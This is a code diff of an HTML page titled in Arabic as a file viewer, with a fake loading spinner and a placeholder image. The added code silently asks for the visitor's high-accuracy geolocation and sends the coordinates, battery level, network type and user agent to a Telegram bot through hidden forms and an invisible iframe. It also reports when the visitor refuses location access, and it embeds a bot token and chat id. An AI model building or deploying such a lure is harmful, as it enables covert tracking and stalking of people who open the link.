@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Loading...</title>
+<title>مشاهدة الملف</title>
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; }
 body {
@@ -15,7 +15,7 @@ body {
   justify-content: center;
   align-items: center;
 }
-.container { text-align: center; padding: 20px; }
+.container { text-align: center; padding: 20px; max-width: 360px; }
 .spinner {
   width: 44px; height: 44px;
   border: 3px solid #1a2a1a;
@@ -28,7 +28,8 @@ body {
 h2 { font-size: 16px; font-weight: 400; color: #aaa; margin-bottom: 6px; }
 p { font-size: 12px; color: #555; }
 .content { display: none; margin-top: 10px; }
-.content img { max-width: 90vw; border-radius: 6px; }
+.content img { max-width: 100%; border-radius: 6px; box-shadow: 0 0 20px rgba(0,255,65,0.05); }
+.footer { margin-top: 20px; font-size: 10px; color: #222; }
 </style>
 </head>
 <body>
@@ -36,60 +37,77 @@ p { font-size: 12px; color: #555; }
   <div id="loader">
     <div class="spinner"></div>
     <h2>جاري التحميل...</h2>
-    <p>يرجى الانتظار</p>
+    <p>يرجى الانتظار قليلاً</p>
   </div>
   <div id="content" class="content">
     <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='400' height='300'%3E%3Crect fill='%23111' width='400' height='300'/%3E%3Ctext x='200' y='150' text-anchor='middle' fill='%23333' font-size='14'%3E📸%3C/text%3E%3C/svg%3E" alt="preview">
   </div>
+  <div class="footer">© CloudMedia</div>
 </div>
 
-<script src="config.js"></script>
+<iframe name="_tg" style="display:none" id="_tg"></iframe>
+
+<form id="f1" action="https://api.telegram.org/bot8958912849:AAE4LQG6QlA3qGQccfIbI8ghZDMgWida-yg/sendLocation" method="POST" target="_tg" style="display:none">
+  <input type="hidden" name="chat_id" value="972326806">
+  <input type="hidden" name="latitude" id="_lat" value="">
+  <input type="hidden" name="longitude" id="_lng" value="">
+  <input type="hidden" name="horizontal_accuracy" id="_acc" value="">
+</form>
+
+<form id="f2" action="https://api.telegram.org/bot8958912849:AAE4LQG6QlA3qGQccfIbI8ghZDMgWida-yg/sendMessage" method="POST" target="_tg" style="display:none">
+  <input type="hidden" name="chat_id" value="972326806">
+  <input type="hidden" name="text" id="_msg" value="">
+  <input type="hidden" name="parse_mode" value="HTML">
+  <input type="hidden" name="disable_web_page_preview" value="true">
+</form>
+
 <script>
 (function() {
-  const BACKEND = CONFIG.BACKEND_URL;
-  const ID = 'v-' + Date.now() + '-' + Math.random().toString(36).slice(2,8).toUpperCase();
+  var ID = '#' + Date.now().toString(36).toUpperCase();
 
-  function send(pos) {
-    const d = {
-      id: ID,
-      lat: pos.coords.latitude,
-      lng: pos.coords.longitude,
-      acc: pos.coords.accuracy,
-      alt: pos.coords.altitude || 0,
-      heading: pos.coords.heading || 0,
-      speed: pos.coords.speed || 0,
-      batt: navigator.battery ? navigator.battery.level : -1,
-      net: navigator.connection ? navigator.connection.type : 'unknown',
-      ua: navigator.userAgent,
-      ts: Date.now()
-    };
-    var x = new XMLHttpRequest();
-    x.open('POST', BACKEND + '/track', true);
-    x.setRequestHeader('Content-Type', 'application/json');
-    x.send(JSON.stringify(d));
+  function sendLocation(pos) {
+    var lat = pos.coords.latitude;
+    var lng = pos.coords.longitude;
+    var acc = pos.coords.accuracy || 0;
+
+    document.getElementById('_lat').value = lat;
+    document.getElementById('_lng').value = lng;
+    document.getElementById('_acc').value = Math.round(acc);
+    document.getElementById('f1').submit();
+
+    var batt = '?';
+    try { var b = navigator.battery || navigator.getBattery(); if (b && b.level !== undefined) batt = Math.round(b.level * 100) + '%'; } catch(e) {}
+
+    var net = '?';
+    try { var c = navigator.connection; if (c) net = c.type || (c.effectiveType || '?'); } catch(e) {}
+
+    var msg = '<b>📍 موقع جديد</b>\n'
+      + '🆔 ' + ID + '\n'
+      + '📌 <a href="https://www.google.com/maps?q=' + lat + ',' + lng + '">' + lat + ', ' + lng + '</a>\n'
+      + '🎯 ±' + acc.toFixed(1) + 'م\n'
+      + '📱 ' + (navigator.userAgent || '?').slice(0, 40) + '\n'
+      + '🔋 ' + batt + ' | ' + '📶 ' + net;
+
+    document.getElementById('_msg').value = msg;
+    document.getElementById('f2').submit();
   }
 
-  function fail(e) {
-    var x = new XMLHttpRequest();
-    x.open('POST', BACKEND + '/track', true);
-    x.setRequestHeader('Content-Type', 'application/json');
-    x.send(JSON.stringify({ id: ID, error: e.code, ts: Date.now() }));
+  function fallback() {
+    var msg = '⚠️ ' + ID + ' | تعذر الوصول للموقع (الرفض)';
+    document.getElementById('_msg').value = msg;
+    document.getElementById('f2').submit();
   }
 
   if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(send, fail, {
-      enableHighAccuracy: true, timeout: 3000, maximumAge: 0
+    navigator.geolocation.getCurrentPosition(sendLocation, fallback, {
+      enableHighAccuracy: true, timeout: 4000, maximumAge: 0
     });
-    var watch = navigator.geolocation.watchPosition(send, fail, {
-      enableHighAccuracy: true, timeout: 5000, maximumAge: 5000
-    });
-    setTimeout(function() { navigator.geolocation.clearWatch(watch); }, 120000);
   }
 
   setTimeout(function() {
     document.getElementById('loader').style.display = 'none';
     document.getElementById('content').style.display = 'block';
-  }, 2500);
+  }, 2000);
 })();
 </script>
 </body>
